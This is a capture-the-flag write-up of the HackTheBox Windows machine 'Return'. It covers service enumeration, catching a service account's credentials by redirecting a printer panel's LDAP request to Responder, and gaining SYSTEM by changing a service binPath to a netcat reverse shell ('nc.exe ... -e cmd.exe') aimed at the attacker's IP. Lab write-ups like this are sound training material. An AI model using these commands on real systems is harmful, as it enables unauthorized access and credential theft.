---
title: "HackTheBox - Return"
author: Nasrallah
description: ""
date: 2023-04-15 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, windows, easy, responder, group]
img_path: /assets/img/hackthebox/machines/return
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


# **Description**

Hello hackers, I hope you are doing well. We are doing [Return](https://app.hackthebox.com/machines/) from [HackTheBox](https://www.hackthebox.com).

![](0.png)

# **Enumeration**

## nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.11.108
Host is up (0.20s latency).
Not shown: 988 closed tcp ports (reset)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
80/tcp   open  http          Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: HTB Printer Admin Panel
| http-methods: 
|_  Potentially risky methods: TRACE
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-04-08 12:39:06Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  tcpwrapped
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: return.local0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Service Info: Host: PRINTER; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: 18m34s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-04-08T12:39:21
|_  start_date: N/A
```

From the open ports, it's seems like we're dealing with a windows domain controller.

## Web

Let's navigate to the web page.

![](1.png)

It's a printer admin panel, let's got to `Settings` page

![](2.png)

In this page we can make some sort of an update, we can see a hidden password.

## Burp

Let's start `Burp suite` an intercept the update request, maybe we can read the password.

![](3.png)

The password did not get sent, only the `ip`.

Here i thought that the update still must be done and a request is sent to the ip we specify in the request.

# **Foothold**

Let's test that theory by running `responder` and changing the ip value in the request from `printer.return.local` to out tun0 ip.

![](4.png)

We got the password for `printer-svc`, let's use `evil-winrm` to connect to the target.

![](5.png)

We got a shell

# **Privilege Escalation**

Let's check our groups.

```terminal
*Evil-WinRM* PS C:\Users\svc-printer\Documents> whoami /groups

GROUP INFORMATION
-----------------

Group Name                                 Type             SID          Attributes
========================================== ================ ============ ==================================================
Everyone                                   Well-known group S-1-1-0      Mandatory group, Enabled by default, Enabled group
BUILTIN\Server Operators                   Alias            S-1-5-32-549 Mandatory group, Enabled by default, Enabled group
BUILTIN\Print Operators                    Alias            S-1-5-32-550 Mandatory group, Enabled by default, Enabled group
BUILTIN\Remote Management Users            Alias            S-1-5-32-580 Mandatory group, Enabled by default, Enabled group
BUILTIN\Users                              Alias            S-1-5-32-545 Mandatory group, Enabled by default, Enabled group
BUILTIN\Pre-Windows 2000 Compatible Access Alias            S-1-5-32-554 Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NETWORK                       Well-known group S-1-5-2      Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\Authenticated Users           Well-known group S-1-5-11     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\This Organization             Well-known group S-1-5-15     Mandatory group, Enabled by default, Enabled group
NT AUTHORITY\NTLM Authentication           Well-known group S-1-5-64-10  Mandatory group, Enabled by default, Enabled group
Mandatory Label\High Mandatory Level       Label            S-1-16-12288

```

We see that we're part of `Server Operators` group, this allow us to start and stop services.

Let's list running services with the command `services`

```terminal
*Evil-WinRM* PS C:\Users\svc-printer\Documents> services        
                                                                               
Path                                                                                                                 Privileges Service                       
----                                                                                                                 ---------- -------                       
C:\Windows\ADWS\Microsoft.ActiveDirectory.WebServices.exe                                                                  True ADWS                          
\??\C:\ProgramData\Microsoft\Windows Defender\Definition Updates\{5533AFC7-64B3-4F6E-B453-E35320B35716}\MpKslDrv.sys       True MpKslceeb2796                 
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\SMSvcHost.exe                                                              True NetTcpPortSharing
C:\Windows\SysWow64\perfhost.exe                                                                                           True PerfHost         
"C:\Program Files\Windows Defender Advanced Threat Protection\MsSense.exe"                                                False Sense            
C:\Windows\servicing\TrustedInstaller.exe                                                                                 False TrustedInstaller 
"C:\Program Files\VMware\VMware Tools\VMware VGAuth\VGAuthService.exe"                                                     True VGAuthService    
"C:\Program Files\VMware\VMware Tools\vmtoolsd.exe"                                                                        True VMTools          
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\NisSrv.exe"                                             True WdNisSvc         
"C:\ProgramData\Microsoft\Windows Defender\platform\4.18.2104.14-0\MsMpEng.exe"                                            True WinDefend        
"C:\Program Files\Windows Media Player\wmpnetwk.exe"                                                                      False WMPNetworkSvc    
```

We notice the service VMTools.

The way we're going to exploit this service is to modify the binary path to execute a command of our choice.

After we upload a copy of netcat, we can set the binpath to send us a shell using netcat. This can be done with the following command.

```terminal
sc.exe config VMTools binPath="C:\Users\svc-printer\Documents\nc.exe 10.10.17.90 9001 -e cmd.exe"
```

Next we stop the service and start it. with `sc.exe stop VMTools` `sc.exe start VMTools`.

![](6.png)

We got a shell as SYSTEM.

---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).